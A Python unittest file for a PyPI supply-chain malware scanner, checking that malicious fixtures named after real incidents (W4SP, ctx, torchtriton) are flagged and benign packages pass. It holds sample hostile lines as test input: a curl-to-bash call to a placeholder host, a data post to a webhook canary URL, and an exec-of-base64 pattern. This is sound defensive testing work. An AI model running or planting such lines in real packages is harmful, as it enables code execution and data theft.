"""Canary + control tests:  python3 -m unittest

Every mal-* fixture must reach its expected level AND fire its expected rule; every ok-*
fixture (modelled on what popular packages really ship) must scan SAFE. The fixtures are
inert: hosts are reserved (.invalid / TEST-NET / placeholder subdomains), tokens are
`CANARY_not_a_real_*` strings, and nothing under tests/fixtures is ever imported or run.
"""
import os
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import pypi_audit as pa  # noqa: E402

FIX = os.path.join(HERE, "fixtures")

EXPECT = {
    "mal-ctx-env-exfil": ("CRITICAL", "env_exfil"),               # ctx 2022
    "mal-w4sp-setup": ("CRITICAL", "obfuscated_exec"),            # W4SP whitespace-hidden exec(b64)
    "mal-w4sp-fernet": ("CRITICAL", "obfuscated_exec"),           # W4SP Fernet stage loader
    "mal-w4sp-stealer": ("HIGH", "stealer"),                      # W4SP Discord / Chrome theft
    "mal-torchtriton-dns": ("CRITICAL", "dns_exfil"),             # torchtriton 2022
    "mal-ultralytics-compromise": ("CRITICAL", "dropper"),             # ultralytics 2024
    "mal-pth-payload": ("CRITICAL", "pth_payload"),               # 2024 .pth persistence
    "mal-pth-writer": ("CRITICAL", "persistence_pth"),
    "mal-pth-module": ("CRITICAL", "exfil_host"),                 # module a .pth imports
    "mal-clipper": ("HIGH", "clipper"),                           # crypto-clipper typosquats
    "mal-revshell-setup": ("CRITICAL", "reverse_shell"),
    "mal-curl-setup": ("CRITICAL", "download_execute"),
    "mal-exec-url": ("CRITICAL", "download_execute"),
    "mal-inline-backend": ("CRITICAL", "exfil_host"),             # PEP 517 in-tree backend
    "mal-hatch-hook": ("CRITICAL", "credential_exfil"),           # hatch custom build hook
    "mal-env-dump-import": ("CRITICAL", "env_exfil"),
    "mal-setup-imported-module": ("CRITICAL", "exfil_host"),     # module setup.py imports
}
# a finding the canary must carry, with the execution context that escalated it
RUNS_AT = {
    "mal-w4sp-setup": "install", "mal-torchtriton-dns": "import", "mal-pth-payload": "startup",
    "mal-pth-module": "startup", "mal-inline-backend": "install", "mal-env-dump-import": "import",
    "mal-setup-imported-module": "install",
}


def load(name):
    d = os.path.join(FIX, name)
    sd = os.path.join(d, "sdist")
    wh = os.path.join(d, "wheel")
    return pa.scan_distribution(pa.files_from_dir(sd) if os.path.isdir(sd) else None,
                                pa.files_from_dir(wh) if os.path.isdir(wh) else None, name, name)


class Canaries(unittest.TestCase):
    def test_every_canary_has_an_expectation(self):
        mal = {n for n in os.listdir(FIX) if n.startswith("mal-")}
        self.assertEqual(mal, set(EXPECT))

    def test_canaries_fire(self):
        for name, (want, rule) in sorted(EXPECT.items()):
            with self.subTest(name):
                r = load(name)
                ids = {f["id"] for f in r["findings"]}
                self.assertGreaterEqual(pa.SEV_ORDER[r["risk_level"]], pa.SEV_ORDER[want], (r["risk_level"], ids))
                self.assertIn(rule, ids)

    def test_context_escalation(self):
        for name, when in sorted(RUNS_AT.items()):
            with self.subTest(name):
                r = load(name)
                self.assertIn(when, {f.get("runs_at") for f in r["findings"]})

    def test_same_code_at_runtime_is_not_escalated(self):
        body = 'import requests\n\ndef f():\n    requests.post("https://webhook.site/x-canary", data={})\n'
        self.assertEqual(pa.scan(body)["risk_level"], "HIGH")
        top = 'import requests\nrequests.post("https://webhook.site/x-canary", data={})\n'
        self.assertEqual(pa.scan(top)["risk_level"], "CRITICAL")
        self.assertEqual(pa.scan(body, ctx="install")["risk_level"], "CRITICAL")


class Controls(unittest.TestCase):
    def test_controls_safe(self):
        oks = sorted(n for n in os.listdir(FIX) if n.startswith("ok-"))
        self.assertGreaterEqual(len(oks), 14)
        for name in oks:
            with self.subTest(name):
                r = load(name)
                self.assertEqual(r["risk_level"], "SAFE", [(f["id"], f["file"], f["line"]) for f in r["findings"]])

    def test_pth_override_shim_is_medium(self):
        # a package-override shim: copies files at every start, URL only in a message string
        r = load("med-pth-override-shim")
        self.assertEqual(r["risk_level"], "MEDIUM", [(f["id"], f["severity"]) for f in r["findings"]])
        self.assertEqual({f["id"] for f in r["findings"]}, {"pth_fs_write"})

    def test_shipped_shell_script_is_medium(self):
        # post-freeze fix: the only held-out false-positive class (dataset / template scripts)
        r = load("med-shipped-shell-script")
        self.assertEqual(r["risk_level"], "MEDIUM", [(f["id"], f["severity"]) for f in r["findings"]])

    def test_pth_capability_is_reported(self):
        r = load("ok-distutils-pth")
        self.assertIn("pth_exec", {f["id"] for f in r["info"]})
        self.assertEqual(r["pth_files"], ["wheel:distutils-precedence.pth"])

    def test_naive_would_flag_controls(self):
        # what calibration buys: a context-free pass flags these benign shapes
        for name in ("ok-distutils-pth", "ok-docstring", "ok-config-loader", "ok-tests-dir"):
            with self.subTest(name):
                d = os.path.join(FIX, name)
                sd, wh = os.path.join(d, "sdist"), os.path.join(d, "wheel")
                self.assertTrue(pa.naive_verdict(pa.files_from_dir(sd) if os.path.isdir(sd) else None,
                                                 pa.files_from_dir(wh) if os.path.isdir(wh) else None))


class Units(unittest.TestCase):
    def test_text_scan(self):
        self.assertEqual(pa.scan("import os\nos.system('curl https://x.invalid/a | bash')\n")["risk_level"], "CRITICAL")
        self.assertEqual(pa.scan("import json\nprint(json.dumps({}))\n")["risk_level"], "SAFE")
        self.assertEqual(pa.scan("# exec(base64.b64decode(x))\n")["risk_level"], "SAFE")

    def test_split_spec(self):
        self.assertEqual(pa.split_spec("requests==2.32.3"), ("requests", "2.32.3"))
        self.assertEqual(pa.split_spec("Flask[async]"), ("Flask", None))

    def test_requirements(self):
        with tempfile.TemporaryDirectory() as td:
            p = os.path.join(td, "requirements.txt")
            with open(p, "w") as fh:
                fh.write("# c\nrequests==2.32.3\nflask>=2 ; python_version>'3'\n-e .\ngit+https://x.invalid/r.git\n"
                         "uvicorn[standard]==0.30.0  # pinned\n--hash=sha256:abc\n")
            self.assertEqual(pa.requirements_specs(p), ["requests==2.32.3", "flask", "uvicorn==0.30.0"])

    def test_build_time_files(self):
        files = {"setup.py": "from okbuild import helper\nimport setuptools\n", "okbuild.py": "", "pkg/__init__.py": "",
                 "pyproject.toml": '[build-system]\nbuild-backend = "be"\nbackend-path = ["_b"]\n', "_b/be.py": ""}
        bt = pa.build_time_files(files)
        self.assertEqual(set(bt), {"setup.py", "okbuild.py", "_b/be.py"})

    def test_toplevel_model(self):
        src = 'import os\n"""doc"""\ndef f():\n    os.system("x")\nos.getcwd()\nif __name__ == "__main__":\n    f()\n'
        masked, top = pa._mask_python(src)
        run = pa._toplevel_lines(top, src.count("\n") + 1)
        self.assertIn(5, run)
        self.assertNotIn(4, run)
        self.assertNotIn(7, run)
        self.assertNotIn("doc", masked)


if __name__ == "__main__":
    unittest.main()
